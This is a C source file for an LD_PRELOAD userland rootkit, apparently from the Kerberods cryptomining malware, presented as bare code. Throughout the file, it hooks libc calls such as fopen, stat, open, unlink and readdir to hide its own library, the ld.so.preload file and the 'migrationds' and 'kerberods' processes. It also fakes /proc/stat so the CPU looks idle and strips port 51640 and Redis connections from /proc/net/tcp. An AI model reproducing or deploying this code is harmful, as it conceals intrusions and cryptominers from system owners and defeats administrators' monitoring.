#define _GNU_SOURCE

#include <stdio.h>
#include <dlfcn.h>
#include <dirent.h>
#include <stdlib.h>
#include <string.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <unistd.h>
#include <limits.h>
#include <errno.h>

#define MAGIC_STRING "migrationds"
#define MAGIC_DEAMON "kerberods"
#define CONFIG_FILE "ld.so.preload"
#define LIB_FILE "libevent_extra-9.5.so"
#define MAGIC_PORT 51640

void *libc;

static void init (void) __attribute__ ((constructor));

static int (*old_access) (const char *path, int amode);
static int (*old_lxstat) (int ver, const char *file, struct stat * buf);
static int (*old_lxstat64) (int ver, const char *file, struct stat64 * buf);
static int (*old_open) (const char *pathname, int flags, mode_t mode);
static int (*old_rmdir) (const char *pathname);
static int (*old_unlink) (const char *pathname);
static int (*old_unlinkat) (int dirfd, const char *pathname, int flags);
static int (*old_xstat) (int ver, const char *path, struct stat * buf);
static int (*old_xstat64) (int ver, const char *path, struct stat64 * buf);

static FILE *(*old_fopen) (const char *filename, const char *mode);
static FILE *(*old_fopen64) (const char *filename, const char *mode);
static DIR *(*old_opendir) (const char *name);
static struct dirent *(*old_readdir) (DIR * dir);
static struct dirent64 *(*old_readdir64) (DIR * dir);

void
__attribute ((constructor))
init (void)
{
    if (!libc){
        libc = dlopen ("/lib64/libc.so.6", RTLD_LAZY);
        if (!libc){
            libc = dlopen ("/lib/x86_64-linux-gnu/libc.so.6", RTLD_LAZY);
            if (!libc){
                libc = dlopen ("/lib/libc.so.6", RTLD_LAZY);
                if (!libc){
                    libc = dlopen ("/lib/i386-linux-gnu/libc.so.6", RTLD_LAZY);
                }
            }
        }
    }
}

static int get_dir_name(DIR* dirp, char* buf, size_t size)
{
    int fd = dirfd(dirp);
    if(fd == -1) {
        return 0;
    }
    
    char tmp[64];
    snprintf(tmp, sizeof(tmp), "/proc/self/fd/%d", fd);
    ssize_t ret = readlink(tmp, buf, size);
    if(ret == -1) {
        return 0;
    }
    
    buf[ret] = 0;
    return 1;
}

static int get_process_name(char* pid, char* buf)
{
    if(strspn(pid, "0123456789") != strlen(pid)) {
        return 0;
    }
    
    char tmp[256];
    snprintf(tmp, sizeof(tmp), "/proc/%s/stat", pid);
    
    FILE* f = fopen(tmp, "r");
    if(f == NULL) {
        return 0;
    }
    
    if(fgets(tmp, sizeof(tmp), f) == NULL) {
        fclose(f);
        return 0;
    }
    
    fclose(f);
    
    int unused;
    sscanf(tmp, "%d (%[^)]s", &unused, buf);
    return 1;
}

FILE *
forge_proc_net_tcp (const char *filename)
{
  char line[LINE_MAX];
    
  unsigned long rxq, txq, time_len, retr, inode;
  int local_port, rem_port, d, state, uid, timer_run, timeout;
  char rem_addr[128], local_addr[128], more[512];
    
  if (!libc){
        libc = dlopen ("/lib64/libc.so.6", RTLD_LAZY);
        if (!libc){
            libc = dlopen ("/lib/x86_64-linux-gnu/libc.so.6", RTLD_LAZY);
            if (!libc){
                libc = dlopen ("/lib/libc.so.6", RTLD_LAZY);
                if (!libc){
                    libc = dlopen ("/lib/i386-linux-gnu/libc.so.6", RTLD_LAZY);
                }
            }
        }
  }
    
  if (!old_fopen)
    old_fopen = dlsym (libc, "fopen");

  FILE *tmp = tmpfile ();

  FILE *pnt = old_fopen (filename, "r");

  while (fgets (line, LINE_MAX, pnt) != NULL) {
    sscanf (line,
	    "%d: %64[0-9A-Fa-f]:%X %64[0-9A-Fa-f]:%X %X %lX:%lX %X:%lX %lX %d %d %lu %512s\n",
	    &d, local_addr, &local_port, rem_addr, &rem_port, &state,
	    &txq, &rxq, &timer_run, &time_len, &retr, &uid, &timeout,
	    &inode, more);


    if (rem_port == MAGIC_PORT || local_port == MAGIC_PORT || rem_port == 6379) {
    }
    else {
        fputs (line, tmp);
    }
  }

  fclose (pnt);


  fseek (tmp, 0, SEEK_SET);

  return tmp;

}

FILE *
forge_proc_cpu (const char *filename)
{
    char line[LINE_MAX];

    if (!libc){
        libc = dlopen ("/lib64/libc.so.6", RTLD_LAZY);
        if (!libc){
            libc = dlopen ("/lib/x86_64-linux-gnu/libc.so.6", RTLD_LAZY);
            if (!libc){
                libc = dlopen ("/lib/libc.so.6", RTLD_LAZY);
                if (!libc){
                    libc = dlopen ("/lib/i386-linux-gnu/libc.so.6", RTLD_LAZY);
                }
            }
        }
    }
    
    if (!old_fopen)
        old_fopen = dlsym (libc, "fopen");
    
    FILE *tmp = tmpfile ();
    
    FILE *pnt = old_fopen (filename, "r");
    
    while (fgets (line, LINE_MAX, pnt) != NULL) {
        fputs("cpu  0 0 3375 498153 97 0 10 0 0 0\ncpu0 0 0 1699 249246 71 0 6 0 0 0\nintr 0 28 0 0 0 378 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 16 0 4129 0 124 1 0 1251 0 3 0 6879 6680 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0\nctxt 543672\nbtime 1544675938\nprocesses 2774\nprocs_running 4\nprocs_blocked 0\nsoftirq 188202 0 129718 1 457 0 0 1 35688 0 22337",tmp);
    }
    
    fclose (pnt);
    
    fseek (tmp, 0, SEEK_SET);
    return tmp;
    
}

int
access (const char *path, int amode)
{
  if (!libc){
        libc = dlopen ("/lib64/libc.so.6", RTLD_LAZY);
        if (!libc){
            libc = dlopen ("/lib/x86_64-linux-gnu/libc.so.6", RTLD_LAZY);
            if (!libc){
                libc = dlopen ("/lib/libc.so.6", RTLD_LAZY);
                if (!libc){
                    libc = dlopen ("/lib/i386-linux-gnu/libc.so.6", RTLD_LAZY);
                }
            }
        }
  }
  if (!old_access)
    old_access = dlsym (libc, "access");

  if (old_xstat == NULL)
    old_xstat = dlsym (libc, "__xstat");
    
  if ((strstr (path, MAGIC_STRING)) || (strstr (path, CONFIG_FILE)) || (strstr (path, LIB_FILE))) {
    errno = ENOENT;
    return -1;
  }

  return old_access (path, amode);
}

FILE *
fopen (const char *filename, const char *mode)
{
  if (!libc){
        libc = dlopen ("/lib64/libc.so.6", RTLD_LAZY);
        if (!libc){
            libc = dlopen ("/lib/x86_64-linux-gnu/libc.so.6", RTLD_LAZY);
            if (!libc){
                libc = dlopen ("/lib/libc.so.6", RTLD_LAZY);
                if (!libc){
                    libc = dlopen ("/lib/i386-linux-gnu/libc.so.6", RTLD_LAZY);
                }
            }
        }
  }
  if (!old_fopen)
    old_fopen = dlsym (libc, "fopen");
    
  if (!old_xstat)
    old_xstat = dlsym(libc, "__xstat");
    
  if (strcmp (filename, "/proc/stat") == 0)
    return forge_proc_cpu (filename);
    
  if (strcmp (filename, "/proc/net/tcp") == 0
      || strcmp (filename, "/proc/net/tcp6") == 0)
    return forge_proc_net_tcp (filename);
    
  if ((strstr (filename, MAGIC_STRING)) || (strstr (filename, CONFIG_FILE)) || (strstr (filename, LIB_FILE))) {
    errno = ENOENT;
    return NULL;
  }

  return old_fopen (filename, mode);
}

FILE *
fopen64 (const char *filename, const char *mode)
{
  if (!libc){
        libc = dlopen ("/lib64/libc.so.6", RTLD_LAZY);
        if (!libc){
            libc = dlopen ("/lib/x86_64-linux-gnu/libc.so.6", RTLD_LAZY);
            if (!libc){
                libc = dlopen ("/lib/libc.so.6", RTLD_LAZY);
                if (!libc){
                    libc = dlopen ("/lib/i386-linux-gnu/libc.so.6", RTLD_LAZY);
                }
            }
        }
  }
  if (!old_fopen64)
    old_fopen64 = dlsym (libc, "fopen64");
    
  if (!old_xstat)
    old_xstat = dlsym(libc, "__xstat");
    
  if (strcmp (filename, "/proc/stat") == 0)
    return forge_proc_cpu (filename);

  if (strcmp (filename, "/proc/net/tcp") == 0
      || strcmp (filename, "/proc/net/tcp6") == 0)
    return forge_proc_net_tcp (filename);
  
  if ((strstr (filename, MAGIC_STRING)) || (strstr (filename, CONFIG_FILE)) || (strstr (filename, LIB_FILE))) {
    errno = ENOENT;
    return NULL;
  }

  return old_fopen64 (filename, mode);
}

int
lstat (const char *file, struct stat *buf)
{
  if (!libc){
        libc = dlopen ("/lib64/libc.so.6", RTLD_LAZY);
        if (!libc){
            libc = dlopen ("/lib/x86_64-linux-gnu/libc.so.6", RTLD_LAZY);
            if (!libc){
                libc = dlopen ("/lib/libc.so.6", RTLD_LAZY);
                if (!libc){
                    libc = dlopen ("/lib/i386-linux-gnu/libc.so.6", RTLD_LAZY);
                }
            }
        }
  }
  if (old_lxstat == NULL)
    old_lxstat = dlsym (libc, "__lxstat");

  if (strstr (file, LIB_FILE) || strstr (file, CONFIG_FILE) || strstr (file, MAGIC_STRING)) {
    errno = ENOENT;
    return -1;
  }

  return old_lxstat (_STAT_VER, file, buf);
}

int
lstat64 (const char *file, struct stat64 *buf)
{
  if (!libc){
        libc = dlopen ("/lib64/libc.so.6", RTLD_LAZY);
        if (!libc){
            libc = dlopen ("/lib/x86_64-linux-gnu/libc.so.6", RTLD_LAZY);
            if (!libc){
                libc = dlopen ("/lib/libc.so.6", RTLD_LAZY);
                if (!libc){
                    libc = dlopen ("/lib/i386-linux-gnu/libc.so.6", RTLD_LAZY);
                }
            }
        }
  }
  if (old_lxstat64 == NULL)
    old_lxstat64 = dlsym (libc, "__lxstat64");

  if (strstr (file, LIB_FILE) || strstr (file, CONFIG_FILE) || strstr (file, MAGIC_STRING)) {
    errno = ENOENT;
    return -1;
  }

  return old_lxstat64 (_STAT_VER, file, buf);
}

int
__lxstat (int ver, const char *file, struct stat *buf)
{
  if (!libc){
        libc = dlopen ("/lib64/libc.so.6", RTLD_LAZY);
        if (!libc){
            libc = dlopen ("/lib/x86_64-linux-gnu/libc.so.6", RTLD_LAZY);
            if (!libc){
                libc = dlopen ("/lib/libc.so.6", RTLD_LAZY);
                if (!libc){
                    libc = dlopen ("/lib/i386-linux-gnu/libc.so.6", RTLD_LAZY);
                }
            }
        }
  }
  if (old_lxstat == NULL)
    old_lxstat = dlsym (libc, "__lxstat");

  if (strstr (file, LIB_FILE) || strstr (file, CONFIG_FILE) || strstr (file, MAGIC_STRING)) {
    errno = ENOENT;
    return -1;
  }

  return old_lxstat (ver, file, buf);
}

int
__lxstat64 (int ver, const char *file, struct stat64 *buf)
{
  if (!libc){
        libc = dlopen ("/lib64/libc.so.6", RTLD_LAZY);
        if (!libc){
            libc = dlopen ("/lib/x86_64-linux-gnu/libc.so.6", RTLD_LAZY);
            if (!libc){
                libc = dlopen ("/lib/libc.so.6", RTLD_LAZY);
                if (!libc){
                    libc = dlopen ("/lib/i386-linux-gnu/libc.so.6", RTLD_LAZY);
                }
            }
        }
  }
  if (old_lxstat64 == NULL)
    old_lxstat64 = dlsym (libc, "__lxstat64");

  if (strstr (file, LIB_FILE) || strstr (file, CONFIG_FILE) || strstr (file, MAGIC_STRING)) {
    errno = ENOENT;
    return -1;
  }

  return old_lxstat64 (ver, file, buf);
}

int
open (const char *pathname, int flags, mode_t mode)
{
  if (!libc){
        libc = dlopen ("/lib64/libc.so.6", RTLD_LAZY);
        if (!libc){
            libc = dlopen ("/lib/x86_64-linux-gnu/libc.so.6", RTLD_LAZY);
            if (!libc){
                libc = dlopen ("/lib/libc.so.6", RTLD_LAZY);
                if (!libc){
                    libc = dlopen ("/lib/i386-linux-gnu/libc.so.6", RTLD_LAZY);
                }
            }
        }
  }
  if (old_open == NULL)
    old_open = dlsym (libc, "open");

  if (old_xstat == NULL)
    old_xstat = dlsym (libc, "__xstat");

  if ((strstr (pathname, MAGIC_STRING)) || (strstr (pathname, CONFIG_FILE)) || (strstr (pathname, LIB_FILE))) {
    errno = ENOENT;
    return -1;
  }

  return old_open (pathname, flags, mode);
}

int
rmdir (const char *pathname)
{
  if (!libc){
        libc = dlopen ("/lib64/libc.so.6", RTLD_LAZY);
        if (!libc){
            libc = dlopen ("/lib/x86_64-linux-gnu/libc.so.6", RTLD_LAZY);
            if (!libc){
                libc = dlopen ("/lib/libc.so.6", RTLD_LAZY);
                if (!libc){
                    libc = dlopen ("/lib/i386-linux-gnu/libc.so.6", RTLD_LAZY);
                }
            }
        }
  }
  if (old_rmdir == NULL)
    old_rmdir = dlsym (libc, "rmdir");

  if (old_xstat == NULL)
    old_xstat = dlsym (libc, "__xstat");

  if ((strstr (pathname, MAGIC_STRING)) || (strstr (pathname, CONFIG_FILE)) || (strstr (pathname, LIB_FILE))) {
    errno = ENOENT;
    return -1;
  }

  return old_rmdir (pathname);
}

int
stat (const char *path, struct stat *buf)
{
  if (!libc){
        libc = dlopen ("/lib64/libc.so.6", RTLD_LAZY);
        if (!libc){
            libc = dlopen ("/lib/x86_64-linux-gnu/libc.so.6", RTLD_LAZY);
            if (!libc){
                libc = dlopen ("/lib/libc.so.6", RTLD_LAZY);
                if (!libc){
                    libc = dlopen ("/lib/i386-linux-gnu/libc.so.6", RTLD_LAZY);
                }
            }
        }
  }
  if (old_xstat == NULL)
    old_xstat = dlsym (libc, "__xstat");

  if (strstr (path, LIB_FILE) || strstr (path, CONFIG_FILE) || strstr (path, MAGIC_STRING)) {
    errno = ENOENT;
    return -1;
  }

  return old_xstat (3, path, buf);
}

int
stat64 (const char *path, struct stat64 *buf)
{
  if (!libc){
        libc = dlopen ("/lib64/libc.so.6", RTLD_LAZY);
        if (!libc){
            libc = dlopen ("/lib/x86_64-linux-gnu/libc.so.6", RTLD_LAZY);
            if (!libc){
                libc = dlopen ("/lib/libc.so.6", RTLD_LAZY);
                if (!libc){
                    libc = dlopen ("/lib/i386-linux-gnu/libc.so.6", RTLD_LAZY);
                }
            }
        }
  }
  if (old_xstat64 == NULL)
    old_xstat64 = dlsym (libc, "__xstat64");

  if (strstr (path, LIB_FILE) || strstr (path, CONFIG_FILE) || strstr (path, MAGIC_STRING)) {
    errno = ENOENT;
    return -1;
  }
  return old_xstat64 (_STAT_VER, path, buf);
}

int
__xstat (int ver, const char *path, struct stat *buf)
{
  if (!libc){
        libc = dlopen ("/lib64/libc.so.6", RTLD_LAZY);
        if (!libc){
            libc = dlopen ("/lib/x86_64-linux-gnu/libc.so.6", RTLD_LAZY);
            if (!libc){
                libc = dlopen ("/lib/libc.so.6", RTLD_LAZY);
                if (!libc){
                    libc = dlopen ("/lib/i386-linux-gnu/libc.so.6", RTLD_LAZY);
                }
            }
        }
  }
  if (old_xstat == NULL)
    old_xstat = dlsym (libc, "__xstat");

  if (strstr (path, LIB_FILE) || strstr (path, CONFIG_FILE) || strstr (path, MAGIC_STRING)) {
    errno = ENOENT;
    return -1;
  }

  return old_xstat (ver, path, buf);
}

int
__xstat64 (int ver, const char *path, struct stat64 *buf)
{
  if (!libc){
        libc = dlopen ("/lib64/libc.so.6", RTLD_LAZY);
        if (!libc){
            libc = dlopen ("/lib/x86_64-linux-gnu/libc.so.6", RTLD_LAZY);
            if (!libc){
                libc = dlopen ("/lib/libc.so.6", RTLD_LAZY);
                if (!libc){
                    libc = dlopen ("/lib/i386-linux-gnu/libc.so.6", RTLD_LAZY);
                }
            }
        }
  }
  if (old_xstat64 == NULL)
    old_xstat64 = dlsym (libc, "__xstat64");

  if (strstr (path, LIB_FILE) || strstr (path, CONFIG_FILE) || strstr (path, MAGIC_STRING)) {
    errno = ENOENT;
    return -1;
  }

  return old_xstat64 (ver, path, buf);
}

int
unlink (const char *pathname)
{
  if (!libc){
        libc = dlopen ("/lib64/libc.so.6", RTLD_LAZY);
        if (!libc){
            libc = dlopen ("/lib/x86_64-linux-gnu/libc.so.6", RTLD_LAZY);
            if (!libc){
                libc = dlopen ("/lib/libc.so.6", RTLD_LAZY);
                if (!libc){
                    libc = dlopen ("/lib/i386-linux-gnu/libc.so.6", RTLD_LAZY);
                }
            }
        }
  }
  if (old_unlink == NULL)
    old_unlink = dlsym (libc, "unlink");

  if (old_xstat == NULL)
    old_xstat = dlsym (libc, "__xstat");

  if ((strstr (pathname, MAGIC_STRING)) || (strstr (pathname, CONFIG_FILE)) || (strstr (pathname, LIB_FILE))) {
    errno = ENOENT;
    return -1;
  }

  return old_unlink (pathname);
}

int
unlinkat (int dirfd, const char *pathname, int flags)
{
  if (!libc){
        libc = dlopen ("/lib64/libc.so.6", RTLD_LAZY);
        if (!libc){
            libc = dlopen ("/lib/x86_64-linux-gnu/libc.so.6", RTLD_LAZY);
            if (!libc){
                libc = dlopen ("/lib/libc.so.6", RTLD_LAZY);
                if (!libc){
                    libc = dlopen ("/lib/i386-linux-gnu/libc.so.6", RTLD_LAZY);
                }
            }
        }
  }
  if (old_unlinkat == NULL)
    old_unlinkat = dlsym (libc, "unlinkat");

  if ((strstr (pathname, MAGIC_STRING)) || (strstr (pathname, CONFIG_FILE)) || (strstr (pathname, LIB_FILE))) {
    errno = ENOENT;
    return -1;
  }

  return old_unlinkat (dirfd, pathname, flags);
}

DIR *
opendir (const char *name)
{
  if (!libc){
        libc = dlopen ("/lib64/libc.so.6", RTLD_LAZY);
        if (!libc){
            libc = dlopen ("/lib/x86_64-linux-gnu/libc.so.6", RTLD_LAZY);
            if (!libc){
                libc = dlopen ("/lib/libc.so.6", RTLD_LAZY);
                if (!libc){
                    libc = dlopen ("/lib/i386-linux-gnu/libc.so.6", RTLD_LAZY);
                }
            }
        }
  }
  if (old_opendir == NULL)
    old_opendir = dlsym (libc, "opendir");

  if (old_xstat == NULL)
    old_xstat = dlsym (libc, "__xstat");

  if (strstr (name, LIB_FILE) || strstr (name, CONFIG_FILE) || strstr (name, MAGIC_STRING)) {
    errno = ENOENT;
    return NULL;
  }

  return old_opendir (name);
}

struct dirent *
readdir (DIR * dirp)
{
  struct dirent *dir;
  if (!libc){
        libc = dlopen ("/lib64/libc.so.6", RTLD_LAZY);
        if (!libc){
            libc = dlopen ("/lib/x86_64-linux-gnu/libc.so.6", RTLD_LAZY);
            if (!libc){
                libc = dlopen ("/lib/libc.so.6", RTLD_LAZY);
                if (!libc){
                    libc = dlopen ("/lib/i386-linux-gnu/libc.so.6", RTLD_LAZY);
                }
            }
        }
  }
  if (!old_readdir)
    old_readdir = dlsym (libc, "readdir");

  do {
    dir = old_readdir (dirp);

    if(dir != NULL) {
        char dir_name[256];
        char process_name[256];
        if(get_dir_name(dirp, dir_name, sizeof(dir_name)) && strcmp(dir_name, "/proc") == 0 && get_process_name(dir->d_name, process_name) && strcmp(process_name, MAGIC_STRING) == 0){
            return NULL;
        }else if (strcmp(process_name, MAGIC_DEAMON) == 0){
            return NULL;
        }
    }
    if (dir != NULL
	&& (strcmp (dir->d_name, ".\0") || strcmp (dir->d_name, "/\0")))
      continue;
  }
  while (dir
	 && (strstr (dir->d_name, MAGIC_STRING) != 0 || strstr (dir->d_name, CONFIG_FILE) != 0 || strstr (dir->d_name, LIB_FILE) != 0));

  return dir;
}

struct dirent64 *
readdir64 (DIR * dirp)
{
  struct dirent64 *dir;

  if (!libc){
        libc = dlopen ("/lib64/libc.so.6", RTLD_LAZY);
        if (!libc){
            libc = dlopen ("/lib/x86_64-linux-gnu/libc.so.6", RTLD_LAZY);
            if (!libc){
                libc = dlopen ("/lib/libc.so.6", RTLD_LAZY);
                if (!libc){
                    libc = dlopen ("/lib/i386-linux-gnu/libc.so.6", RTLD_LAZY);
                }
            }
        }
  }
  if (!old_readdir64)
    old_readdir64 = dlsym (libc, "readdir64");

  do {
    dir = old_readdir64 (dirp);
    
    if(dir != NULL) {
      char dir_name[256];
      char process_name[256];
      if(get_dir_name(dirp, dir_name, sizeof(dir_name)) && strcmp(dir_name, "/proc") == 0 && get_process_name(dir->d_name, process_name) && strcmp(process_name, MAGIC_STRING) == 0){
          return NULL;
      }else if (strcmp(process_name, MAGIC_DEAMON) == 0){
          return NULL;
      }
    }
    if (dir != NULL
	&& (strcmp (dir->d_name, ".\0") || strcmp (dir->d_name, "/\0")))
      continue;
  }
  while (dir
	 && (strstr (dir->d_name, MAGIC_STRING) != 0 || strstr (dir->d_name, CONFIG_FILE) != 0 || strstr (dir->d_name, LIB_FILE) != 0));

  return dir;
}
